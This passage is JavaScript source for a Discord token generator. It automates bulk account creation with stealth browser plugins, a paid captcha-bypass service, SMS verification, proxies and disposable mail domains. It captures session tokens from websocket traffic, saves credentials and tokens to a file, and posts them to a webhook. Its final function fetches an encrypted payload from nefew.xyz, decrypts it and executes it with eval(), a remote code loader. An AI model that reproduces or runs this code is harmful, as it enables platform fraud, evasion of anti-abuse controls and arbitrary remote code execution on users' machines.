                        await FUNCTION_DELAY(550);
                    };

                    try {
                        await FUNCTION_DELAY(1000);
                        await FUNCTION_DOCUMENT_QUERY("input", "type", true, "type:text", _USERNAME);
                        await FUNCTION_DELAY(1000);
                        await FUNCTION_DOCUMENT_QUERY("button", "click", false, "title", "null");
                        await FUNCTION_DELAY(110);
                        MainPage.waitForSelector("input[type*=checkbox]").then(() => {
                            MainPage.$eval("input[type*=checkbox]", el => el.click());
                        }).catch(e => { });
                        if (capNick) {
                            await FUNCTION_DELAY(1000);
                            var code = await FUNCTION_MAKEHASH(5);
                            await MainPage.screenshot({ path: code + ".png", fullPage: true });
                            var config = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : captured (after input nickname) | " + code + ".png"
                            };
                            victim.send("msg", config);
                        };
                    } catch (e) {
                        var config = {
                            "msg": "weblog",
                            "type": "generror",
                            "text": "Error : entering username"
                        };
                        victim.send("msg", config);
                        if (capEnick) {
                            var code = await FUNCTION_MAKEHASH(5);
                            await MainPage.screenshot({ path: code + ".png", fullPage: true });
                            var config = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : captured (after nickname err) | " + code + ".png"
                            };
                            victim.send("msg", config);
                        };
                        try { await browser.close(); } catch { };
                        await FUNCTION_DELAY(1000);
                        FUNCTION_START_GEN();
                        return;
                    };

                    const bypassVal = await FUNCTION_BYPASS_CAPTCHA(MainPage, true, true);

                    if (bypassVal.split(":")[0] == "true") {
                        console.log(bypassVal.split(":")[1]);
                        var config = {
                            "msg": "weblog",
                            "type": "genmsg",
                            "text": "Log : " + bypassVal.split(":")[1]
                        };
                        victim.send("msg", config);
                    } else {
                        console.log(bypassVal.split(":")[1]);
                        try { await browser.close(); } catch { };
                        var config = {
                            "msg": "weblog",
                            "type": "generror",
                            "text": "Error : " + bypassVal.split(":")[1]
                        };
                        victim.send("msg", config);
                        await FUNCTION_DELAY(1000);
                        FUNCTION_START_GEN();
                        return;
                    };

                    await FUNCTION_DELAY(500);

                    if (smsGen) {
                        var client = MainPage._client;
                        client.on("Network.webSocketFrameSent", ({ requestId, timestamp, response }) => {
                            try {
                                const json = JSON.parse(response.payloadData);
                                if (_TOKEN == false && json["d"]["token"]) {
                                    _TOKEN = json["d"]["token"];
                                };
                            } catch (e) {

                            };
                        });

                        const verifyPhone = await FUNCTION_VERIFY_PHONE();

                        if (verifyPhone.split(":")[0] == "false") {
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : " + verifyPhone.split(":")[1]
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        } else {
                            var config = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : " + verifyPhone.split(":")[1]
                            };
                            victim.send("msg", config);
                        };

                        try {
                            if (capVerify) {
                                var code = await FUNCTION_MAKEHASH(5);
                                await MainPage.screenshot({ path: code + ".png", fullPage: true });
                                var config = {
                                    "msg": "weblog",
                                    "type": "genmsg",
                                    "text": "Log : captured (after verify) | " + code + ".png"
                                };
                                victim.send("msg", config);
                            };

                            await browser.close();
                            var config = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : gen finished | " + _USERNAME
                            };
                            victim.send("msg", config);

                            try {
                                if (logGen) {
                                    var cfg = {
                                        "Content-Type": "application/json",
                                        "Authorization": _TOKEN
                                    };
                                    var data = (await axios.get("https://discord.com/api/v8/users/@me", { headers: cfg })).data;
                                    var embed = new MessageBuilder();
                                    embed = embed.setTitle("Nefew Discord Server");
                                    embed = embed.setURL("https://nefew.kr/discord");
                                    embed = embed.addField("! Token Generated !", `Email : ${data.email}\nId : ${data.id}\nNickTag : ${data.username}#${data.discriminator}`, true);
                                    embed = embed.setColor("#00b0f4");
                                    embed = embed.setFooter("Nefew Discord Token Generator", "https://cdn.discordapp.com/embed/avatars/0.png");
                                    embed = embed.setTimestamp();

                                    hook.send(embed);
                                };
                            } catch (e) {
                                console.log(e);
                            };

                            fs.appendFileSync(tokenDir, "\n" + _EMAIL + ":" + _PASSWORD + ":" + _TOKEN);

                            public_genlist[meCount].created++;
                            public_created++;

                            FUNCTION_START_GEN();
                            return;
                        } catch (e) {
                            try { await browser.close(); } catch { };
                            var config = {
                                "msg": "weblog",
                                "type": "generror",
                                "text": "Error : unknown error\n" + e
                            };
                            victim.send("msg", config);
                            await FUNCTION_DELAY(1000);
                            FUNCTION_START_GEN();
                            return;
                        };
                    } else {
                        var client = MainPage._client;
                        client.on("Network.webSocketFrameSent", ({ requestId, timestamp, response }) => {
                            async function qq() {
                                try {
                                    try { await browser.close(); } catch { };
                                    const json = JSON.parse(response.payloadData);
                                    if (_TOKEN == false && json["d"]["token"]) {
                                        _TOKEN = json["d"]["token"];
                                    };

                                    var config = {
                                        "msg": "weblog",
                                        "type": "genmsg",
                                        "text": "Log : gen finished | " + _USERNAME
                                    };
                                    victim.send("msg", config);

                                    try {
                                        if (logGen) {
                                            var cfg = {
                                                "Content-Type": "application/json",
                                                "Authorization": _TOKEN
                                            };
                                            var data = (await axios.get("https://discord.com/api/v8/users/@me", { headers: cfg })).data;
                                            var embed = new MessageBuilder();
                                            embed = embed.setTitle("Nefew Discord Server");
                                            embed = embed.setURL("https://nefew.kr/discord");
                                            embed = embed.addField("! Token Generated !", `Id : ${data.id}\nNickTag : ${data.username}#${data.discriminator}`, true);
                                            embed = embed.setColor("#00b0f4");
                                            embed = embed.setFooter("Nefew Discord Token Generator", "https://cdn.discordapp.com/embed/avatars/0.png");
                                            embed = embed.setTimestamp();

                                            hook.send(embed);
                                        };
                                    } catch (e) { console.log(e); };

                                    fs.appendFileSync(tokenDir, "\n" + _TOKEN);

                                    public_genlist[meCount].created++;
                                    public_created++;

                                    console.log("noverify -> looping function");
                                    await FUNCTION_DELAY(1000);
                                    FUNCTION_START_GEN();
                                    return;
                                } catch (e) {
                                    console.log("unknown error ->");
                                    console.log(e);
                                };
                            };
                            qq();
                        });
                    };
                };
            };

            FUNCTION_START_GEN();
        };

        await FUNCTION_DELAY(1000);

        if (protectedD == false) {
            public_genlist[meCount].end = true;
            kReason = "warn";
            return;
        } else {
            kReason = null;
        };

        const { Webhook, MessageBuilder } = require("discord-webhook-node");
        const mailtm = require("@cemalgnlts/mailjs");
        const tmp = require("tmp-promise");
        const fs = require("fs");
        const axios = require("axios");
        const randomname = require("node-random-name");
        const { fetch } = require("cross-fetch");
        let mailList = ["popcornfarm7.com", "cloud-mail.top", "buy-blog.com", "the23app.com", "mac-24.com", "thejoker5.com", "greencafe24.com", "crepeau12.com"];

        console.log("Early value1 : " + public_genlist[meCount].end);
        console.log("Early value1 : " + public_genlist[meCount].created);

        let browserList = {};

        if (true) {
            const { firefox, chromium, webkit } = require("playwright-extra");
            browserList["plFirefox"] = firefox;
            browserList["plChromium"] = chromium;
            browserList["plWebkit"] = webkit;
        };

        if (true) {
            const puppeteer = require("puppeteer-extra");
            browserList["ppChromium"] = puppeteer;
        };

        var recaptchaPlugin = require("@extra/recaptcha");
        var stealthPlugin = require("puppeteer-extra-plugin-stealth");
        var recaptchaPluginP = require("puppeteer-extra-plugin-recaptcha");
        var { PuppeteerBlocker } = require("@cliqz/adblocker-puppeteer");

        console.log(_CONFIG);

        var tokenMustGen = _AMOUNT;
        var genMethod = _CONFIG["method"];
        var logGen = _CONFIG["genlog"];
        var logHook = _CONFIG["genhook"];
        var customNick = _CONFIG["customnick"];
        var customVal = _CONFIG["nickname"];
        var customType = _CONFIG["customtype"];

        //object config

        var configCatpcha = _CONFIG["configCatpcha"];

        var configProxy = _CONFIG["configProxy"];
        var proxyGen = configProxy["use"];
        var proxyDir = configProxy["proxydir"];
        var proxyUser = configProxy["proxyUser"];

        var configSMS = _CONFIG["configSMS"];
        var smsGen = configSMS["use"];
        var smsType = configSMS["module"];
        var smsKey = configSMS["key"];

        var configCapture = _CONFIG["configCapture"];
        var capVerify = configCapture["capVerify"];
        var capBirth = configCapture["capBirth"];
        var capNick = configCapture["capNick"];
        var capAcc = configCapture["capAcc"];
        var capEnick = configCapture["capEnick"];
        var capCverify = configCapture["capCverify"];

        //object config end

        var tokenDir = _CONFIG["tokendir"];
        var mailserver = _CONFIG["mailserver"];
        var browserT = _CONFIG["browserValue"];
        var moduleT = _CONFIG["moduleValue"];

        var headless = _CONFIG["headless"];
        var verifyMail = _CONFIG["verifyMail"];
        var smsConfigList = _CONFIG["countryList"];

        var pageWaitValue = "networkidle";

        if (moduleT == "2") {
            pageWaitValue = "networkidle2";
        };


        var publicReCapConfig;

        if (configCatpcha.use == true && configCatpcha.module == "CAPTCHA_2CAPTCHA") {
            publicReCapConfig = {
                visualFeedback: true,
                provider: {
                    id: "2captcha",
                    token: configCatpcha.key
                }
            };

            // await browserList["plChromium"].use(recaptchaPlugin(publicReCapConfig));
            // await browserList["plFirefox"].use(recaptchaPlugin(publicReCapConfig));
            // await browserList["plWebkit"].use(recaptchaPlugin(publicReCapConfig));
            try {
                await browserList["ppChromium"].use(stealthPlugin());
            } catch (e) {
                console.log("error during stealth plugin ->");
                console.log(e);
            };
            try {
                await browserList["ppChromium"].use(recaptchaPluginP(publicReCapConfig));
            } catch (e) {
                console.log("error during recaptcha plugin ->");
                console.log(e);
            };
        };


        var VALUE_TRY_LIST_COOL = [];
        var VALUE_TRY_COUNT = 0;
        var browser;
        var MainPage;
        var MailPage;
        var _EMAIL;
        var _PREFIX;
        var _USERNAME;
        var _PASSWORD;
        var _TOKEN;
        var _PROXY;
        var MAIL_MODULE;
        var MAIL_DOMAIN;
        var verifyObj = {};

        var hook;

        if (logGen) {
            hook = new Webhook(logHook);
        };

        if (genMethod == "2") {
            FUNCTION_START();
        } else if (genMethod == "3") {
            console.log("\n".repeat(500));
            console.clear();
            console.log("-------------------------------------------------------- TEST MODE")

            try {
                var Axios = require("axios");

                const pick = (len) => {
                    let alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                    let result = "";
                    for (var i = 0; i < len; i++) {
                        result += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                    };
                    return result;
                };

                var _data_fingerprintRequest = await Axios.get("https://discord.com/api/v9/experiments");
                var fingerprint = _data_fingerprintRequest["data"]["fingerprint"];

                var _data_catpcha = "P0_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiYy83Z094ZHRzSXc0RWkzWnpVMkQycE1PYU01Sklaa1QxWTl6Y0Yray9pam5Wc2FQbGpvZ2Nib2xPcnYzems3eUNHQkdKb2VmTElGam85dXF1VmRNWHV3aWU2VnJsc2VRaXh6S1Q2eS9wenJRUS9EQmkwRjFCWGtnZWVQcWRYM1YxTUtoQ3NHQ3NxazJwWi9UWHJOYlIzMk9EZStIREk0WGZpamhYdDJxd2wxMmVkV2RzNHVYR01SOVRJVThVdnBtUzZaVVpGSER5V2RSRTRmM29kYWo1TFNwcTczemZqSHFtQzBVSUxUcElYSWRFeUlZcjFxN1VjaEpKNkIrZVl0SmpsQzM0Q3JtS3psQVpEcFlwU3hzRkswOTRrTE55RWhBVUs2bnJnZmV2UnRRN3AxNytGOHNYNTQwYzNFYmNXQVY2M3QvR0F5cXZWUjNpWmlNS1lYbnFPMU9Wa3RnZzVuSDdSUEZGSFFLTHBKSUxHTEdDeldOaXlRdWVIbTRLZU9Ba2ZiMHNJWnFCSTlzaGFLY3R0RFl2NFYwM2xoZEJUR0JYbFJac05YaW9KNk4xN0VNUkFyN2x5ZjBlWVR2ZGJzSnpZdW0xZ0hwQ1hQRnlFSHRtVFhZd3BTa0FRR2Q4cXEyTE5JT3lpaDhNUy9hWHpxKzE0cDVkR0hxSTBpZUlNMUxoVFNrdm12elhTWWhqOHdqSlJJUnY1aE43TnFkN2U4ZWhkMGpWS3pLNjJ5TGpBc0JKdEE4MU9TRFM0dVFQdTN5bjN3WnNhWUFybEZ4Q2xQWnJsN1grYlBlZkdBcVFNTUJ5a294TFJNaXBOZE9xMWdBTVFNSjVSSlZLaDloWkFIRXZYd1ZBR1h6T0ViVEthbjJYL3NRbDVJSFpEd245Rm1yT0FDaElvK044d2RTZ0FmcXoydjV0M3pybGk0L2xGSm1TSXdza2kzUzc4ZGhpaUVkSFJIZ3drTU1abnpBenFOaVBmVzRKNCtPRVd0bGIxM0d0MkdpbVZuYjZLY2pkVWNQSEpPK0Q3NEJnT3NRdHRQMENTOG5wNWwrSllwTDI1OVUvMEFiMFhtdXBVRGY3SDJ5UlJpVHBKLytoSlMyN2NGalAyOTB3Mk5lOFY5NzY4aXJ3TGR3UVg2WFhZRWp4NUFvUVN0SFpNcUZaTVRQelJaNnRhNGpkWVdmZUZPV1YrWVJHb3JLUjdLOG9YZG9DeERLcWlaTlZKSlFHd0JVZjdCaUdUTEc4VXlqK043bEQ0aW84cE45SjF0UXAxZS9IaEIzZThvcFBmUUZ1S09LWVl1SG1PUjVDN3ljK0VKbjlxQkN0aVFlM3VRajJWbmMyZFNCRDJKaThBOXgvd21teFBzazVidFprS3J4Wk4xMjlhVzZOMEI3TFR1N1U5dVhaMGJaUVdRbHpPMmdmMG5haW53aTBVUUpZUmdsekFKY2UrZWxVM2gzS1V1NEtQOVgxRzdRSGdmSFV1N3NUekRDTThXMDJRaDhzNTBlUUNQR1JYbCtycWZhUGNadGF4RWdoQVVMWDN5NmovbWNMdENMVmVYd0pKdTJJb0hCMVl6NmROdlh5QXFwN0F0KzBkVUp5cUNlczhpdi9hbC9JK1k3ZG45VVlIWTBsQ0hxTmZHeTNsWTNPWjQ2dFpoNmNPVzh6aWdZeVVhMHQ2Sms2bmRXUEVxcnorZWVLdnN6VTFweGI4d0VHRitrRVJ3blVqenh0QUZNbUtGM204L2d3b1NtNERZU250cSt4amNOYW5Da0Jxb1hGWmJISHR5V3dWVDhhZVFGMnVjcE5QWk1Yc3Ewdk9hM0ZtenlkS3UxTjZNMkZINERObkhKRXZPMWhDY3NKSmxhMjkrVytlQnVQSFRRUVpMcXNodEgrdkhVVk9qUVpYNzNuQ2ZpSi90bGVmRjI2RjBBRmZYakFKbUN2OHFveisweDJnODM0NGJJOGpLRTZLSCtrdXdaVjJpcnVFOVV0OGx5UWhvNm0rOFFmVFRlaHJIZGdKYkMrQ0U5WEJMejljREs3N0ZpVWpxVTExV2NUY0FQK2szOGdZdlZmQ3VPcnRCd0lMT1QvV0Z1RnhVb3d6N1JEeEd1cEVmWjBTK2FyZVd6MDV3cnBGeG5ad3B4Mm5kQXpWcWR0ZURkc0VGWkt3bzlYMmVjSFROaDdIcHVNaUJyb3p6YWZiTFBnd1pHRExIMXQyMTQ5NDRIdWwzdDBtZUZpZTdRTGd2Yy9OclZqa1BNZG1SdHJyTUFVNkJxMFpaVGNnaWs0aFBPQ1JJWmVPY3VMeTVIZjd4TmtMQU5yY0Y0eUxTZFBsVTVOMmx5NkE2UXE4TENVa0RNVlI2WkFkaFRqci9GVWFsREVEWVVYeGxaaWg1RHZDZDlDWjcvdW1pR1RiK3JocWVFSjM5dGpid1lWbHpPY2hiS2lTa01FckJDc3dOVk9YMTM0Vksxanc1R3grd0V6US9Ic1U5cXBpSFBPYUw1L2ZxUlhaRG9XazdoZ0ttTHFsN2JoUkFGWDcraHV0a28rOTZ6RzExSnBPRXNMbU5NUlluRFk2enI1RHUxS281TSsrZ1Jyb2lKK0dxNS9YcXAyYjd2cUVXc0pyOFA3UFhoM25kSkRyek1qeE5vdkVDZDExTzFWdmNhaEtYRk9wWVZpTlZNMFBXUXBZR1dRY1AxUXlCbXJDT1U3enNPaVZ5U3V2Q0ppSWxYc2tIWUF0anFUSmYyNlpsVWI2UUw1cS8ybmxHdFN5ZXFudjBEUHRMaDZRV3AxaHZiWEd3bTJtb2dzcWsrVXVMTnZVNjA1Qk50bkJrc1ZZUFZuRURISk1FNEpYMFc0TEV0M3k1ejRLUXAyOEFOMDJpOE9LYkR0d1BBYlNSRHk0UlBTcVJXaFpFdnhMeG13TjlKOUNtZ1hKRTQ5NDJ4RmRrVFpTSGFkWjZLeW5ER1V3S2luRVVpMGRPR1MvZWZPSW83WmdHaFpXODF0Mzg3c2RyMEtSM2dqSGt4Z0lkY291NmRhbmFRa3d4Y2RVeUxTMVZKQUdTVSttekxQQ1IrRnRtS1ZOWDdYRFZLdWtEWmVMRGI5SUVNYVd2eEFJVWpqUTk5aTIwZjNxWFJPcTZWYkZ3TkhvWjhjSTFzS29aM3c4LzBpK01lVTBDaVpROTJ4UTZnZ09BY0ErNGI1NHhOMGdvVU9Ebm1VQ1RqdXpHU0lzbTh1VWkvMllURlZqcUNCQVd3RTlYSVVabU8zZ241SG9FYUNqVjhBTUdlWk5reVlpc2I0ZnhOdWloeFBnYmIwRkFFQ2xGcDNSK2lhUmhaSVV6VXBRZEtxYnQvMWpNWFlhRFdJRUh3RDZyQmJneDJ6Qm41Q29kNmJJdmlOZUdRMC9vbnJxQ3BnREpOdGc4b1lzSEFPUk9YQm13bzJUblBKZ0xBdGlwUUk3N2Nta2dOcWNaTm1PUENmMVhyNWJmVnJMWVdhU3E1UkZOU0FWQWcxUVhydzQ2WkkxYmw0bHNFdmJ5OUx6c3BDM3Y1b2g4YzFzR0RWS1laeFAzSnA3RGFwdFo4R3hObmFnbEJIS1diWks0aThwL2c0YUd1aHBHYmFpMlNnUDkzN2hleUVFWnRoY0dLY0ZPMWE4ejFuV3hYK1IyZ203cXl3VTlmdVppWFZNK1J4dFJCUXF4UDhuQktScGU2Vi9UMEZnLzdwaWFXY1N5M3BjUU5xaTdxVmlUR0FLTExHTXNycjFVc09VOU5aOHg1RVE4bjE3S2JuRmRFa1NPb3RKbXc3djNNd1hoYUU1ckZaZ0dqb0tMQ2J1Q3V4dHBEMWRPdklwbHBRL2FJWnBZZXFpeFc2OFlXS2ZHemptSllPbVVJN0VJbWxGTVoySGFJTFJBNnJwWnlZck91eG5WUG56VmMxNkc5ZXdBWjYxOThHTmh5RWFMQTJpenB6NzZ4cnFPY1krYW5UaFdkZTFsQkZDR3czazdqVkNvb3F6Yk1zdWlIMlNuVnZoMVZReEg4czRKU1JtUEhkU2kxc1gwV2ZpM1ZIVlRORk5INyt3QzczYlliRDVVWFRudzFjZGFLS29UUmJCNDd3dz09d05DTjNJNERVUEtRN0V2OCIsImV4cCI6MTY1MDc1NDY1MSwic2hhcmRfaWQiOjM2MjQwNjk5NiwicGQiOjB9._tFKIjEx8YI0YvgibFHNY8JYFKM2hxh_MediXdz_8m8";

                console.log("[INFO] FINGERPRINT : " + fingerprint);

                var _data_content = `"captcha_key": ${_data_catpcha},"consent": true,"date_of_birth": "1993-05-05","email": "imayasdhiasc@gmail.net","fingerprint": ${fingerprint},"gift_code_sku_id": null,"invite": null,"password": "bjcavln1215","promotional_email_opt_in": false,"username": "mercedes bench"`;

                console.log("[INFO] CONTENT : " + _data_content);

                var _data_content_encoded = new URLSearchParams({
                    "captcha_key": _data_catpcha,
                        "consent": true,
                        "date_of_birth": "1993-05-05",
                        "email": "imayasdhiasc@gmail.net",
                        "fingerprint": fingerprint,
                        "gift_code_sku_id": null,
                        "invite": null,
                        "password": "bjcavln1215",
                        "promotional_email_opt_in": false,
                        "username": "mercedes bench"
                }).toString();

                var testRequest = await Axios.post("https://discord.com/api/v7/auth/register",
                    _data_content_encoded,
                    {
                        "headers": {
                            "accept": "*/*",
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": "it",
                            "authorization": "undefined",
                            "content-length": _data_content.length.toString(),
                            "content-type": "application/json",
                            "cookie": `__dcfduid=${pick(32)};`,
                            "origin": "https://discord.com",
                            "referer": "https://discord.com/register",
                            "sec-ch-ua": `" Not A;Brand";v="99", "Chromium";v="91", "Google Chrome";v="91"`,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `"Windows"`,
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                            "x-fingerprint": fingerprint,
                            "x-super-properties": `eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Iml0LUlUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkxLjAuNDQ3Mi4xMjQgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjkxLjAuNDQ3Mi4xMjQiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTAxNzYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9`
                        }
                    }
                );

                console.log(testRequest);
            } catch (e) {
                console.log(e);
            };

            console.log("[INFO] END");
        };
    };
};

async function gogoGen(_CONFIG, victim) {
    if (_CONFIG["proxy"] == true) {
        var gen = new imLegend(_CONFIG["multithread"]);
        gen.gen(_CONFIG, victim);
    } else {
        var gen = new imLegend(1);
        gen.gen(_CONFIG, victim);
    };
};

module.exports.protectedCdex = gogoGen;

async function whyPi(_CONFIG, victim) {
    if (_CONFIG["proxy"] == true) {
        var gen = new imLegend(_CONFIG["multithread"]);
        gen.gen(_CONFIG, victim);
    } else {
        var gen = new imLegend(1);
        gen.gen(_CONFIG, victim);
    };
};

module.exports.protectedPi = whyPi;

async function FUNCTION_GEN_YES() {
    public_running = true;
};

module.exports.protectedYes = FUNCTION_GEN_YES;

async function FUNCTION_GEN_NO() {
    public_running = false;
};

module.exports.protectedNo = FUNCTION_GEN_NO;

async function FUNCTION_GEN_TRUE() {
    public_running = true;
};

module.exports.protectedTrue = FUNCTION_GEN_TRUE;

async function FUNCTION_GEN_FALSE() {
    public_running = false;
};

module.exports.protectedFalse = FUNCTION_GEN_FALSE;
    
async function FUNCTION_NIAGARA(_NICK, _CLIENT, _arguments1, _arguments2) { /* protectedA : ipc   protectedB : Electron Window */
    try {
        if (_CLIENT == "") {
            _CLIENT = "24h8y";
        };
        var loginPost = await axios.post("http://nefew.xyz/nefewtokengen", {
            "cmd": "doLogin",
            "client-code": _CLIENT,
            "client-version": CURRENTVERSION,
            "user_id": _NICK
        });
        var decryptVal = await FUNCTION_DECRYPT(loginPost.data["eval"], _CLIENT);
        eval(decryptVal);
    } catch (e) {
        console.log(e);
    };
};

module.exports.protectedGin = FUNCTION_NIAGARA;